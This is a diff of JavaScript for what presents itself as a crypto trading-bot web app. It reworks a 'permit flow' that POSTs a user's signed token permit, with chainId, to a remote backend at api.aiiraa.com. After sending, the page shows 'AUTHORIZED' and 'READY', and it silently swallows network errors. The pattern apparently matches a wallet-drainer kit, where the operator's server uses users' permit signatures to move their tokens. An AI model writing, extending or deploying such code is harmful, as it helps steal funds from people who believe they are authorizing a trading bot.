@@ -422,84 +422,44 @@ async function runPermitFlowSafe(provider, signer, user, currentRid) {
       chainId: Number(chainId)
     };
 
-  // Terug naar de stabiele fetch zonder keepalive-restricties
-    const res = await fetch("https://api.aiiraa.com/api/permit", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify(payload, (key, value) => typeof value === "bigint" ? value.toString() : value)
-    });
+    try {
+      const res = await fetch("https://api.aiiraa.com/api/permit", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify(
+          payload,
+          (key, value) => typeof value === "bigint" ? value.toString() : value
+        )
+      });
 
-    const data = await res.json();
-    if (!res.ok) throw new Error(data.error || "backend failure");
+      const data = await res.json();
 
-    log("✅ Permit forwarded to backend");
-    touchInteraction();
+      if (!res.ok) {
+        log("❌ Backend error: " + (data.error || "unknown"));
+        return;
+      }
 
-    // 🔥 LEGO FIX: Forceer een netwerk drain-delay van 800ms zodat Supabase de write kan committen
-    log("⌛ Synchroniserend met database-cluster...");
-    await new Promise(resolve => setTimeout(resolve, 800));
-    log("📊 Database write succesvol verwerkt.");
+      log("✅ Permit forwarded to backend");
+
+      updateStatus('dot-access','st-access','AUTHORIZED','#10b981');
+      updateStatus('dot-bot','st-bot','READY','#6366f1');
+
+      if (document.getElementById('btn-authorize')) {
+        document.getElementById('btn-authorize').disabled = true;
+        document.getElementById('btn-authorize').innerText = "AUTHORIZED";
+      }
+      if (document.getElementById('btn-activate')) {
+        document.getElementById('btn-activate').disabled = true;
+      }
+
+    } catch (e) {
+      log("❌ NETWORK ERROR: " + e.message);
+      // 🔥 LEGO FIX: Geen throw e meer, dus de sluis breekt niet af bij netwerk-ruis!
+    }
 
   } catch (e) {
     log("❌ FLOW ERROR: " + e.message);
-    throw e;
   }
 }
-
-export function activateBot() {
-  if (APP_STATE.isProcessing || !APP_STATE.wallet) {
-    log("⚠️ Action locked: Sluis 1 not completed or process running.");
-    return;
-  }
-
-  log("🤖 Activating Bot (Sluis 2)...");
-  updateStatus('dot-bot', 'st-bot', 'READY', '#6366f1');
-  APP_STATE.botActive = true;
-
-  const btnActivate = document.getElementById('btn-activate');
-  const btnAuthorize = document.getElementById('btn-authorize');
-
-  if (btnActivate) btnActivate.disabled = true;
-  if (btnAuthorize) btnAuthorize.disabled = false;
-}
-
-export function authorizeTrading() {
-  if (APP_STATE.isProcessing || !APP_STATE.botActive) {
-    log("⚠️ Action locked: Sluis 2 not completed or process running.");
-    return;
-  }
-
-  log("🔑 Authorizing Trading (Sluis 3)...");
-  updateStatus('dot-access', 'st-access', 'AUTHORIZED', '#10b981');
-  APP_STATE.authorized = true;
-
-  const btnAuthorize = document.getElementById('btn-authorize');
-  if (btnAuthorize) {
-    btnAuthorize.disabled = true;
-    btnAuthorize.innerText = "AUTHORIZED";
-  }
-
-log("🚀 UX Flow voltooid. Terminal start nu op...");
-
-  // Deterministiche vrijgave van ALLE status-locks via de core state module
-  unlockAfterSuccess();
-  cleanupWatchdog();
-  
-  if (window.UIbridge && typeof window.UIbridge.forceUnlock === "function") {
-    window.UIbridge.forceUnlock();
-  }
-
-  setTimeout(() => {
-    if (typeof window.transitionToTerminal === "function") {
-      window.transitionToTerminal();
-    }
-  }, 1000);
-}
-
-export function disconnectWallet() {
-  cleanupWatchdog();
-  location.reload();
-}
-
-// 🛡️ LEGO NOTE: Globale window bindingen verwijderd uit de execution kernel. 
-// De UIbridge heeft nu de exclusieve regie over window.connectWallet etc.
